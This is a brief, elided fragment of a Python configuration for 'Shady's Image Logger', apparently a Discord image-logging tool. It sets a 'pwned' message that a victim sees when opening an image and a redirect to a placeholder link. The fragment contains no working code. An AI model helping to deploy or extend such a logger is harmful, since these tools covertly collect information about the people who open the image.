...
config = {
    ...
    "message": { # Show a custom message when the user opens the image
        ...
        "message": "This browser has been pwned by Shady's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
    ...
    "redirect": {
        ...
        "page": "yourlink!" # Link to the webpage to redirect to 
    },
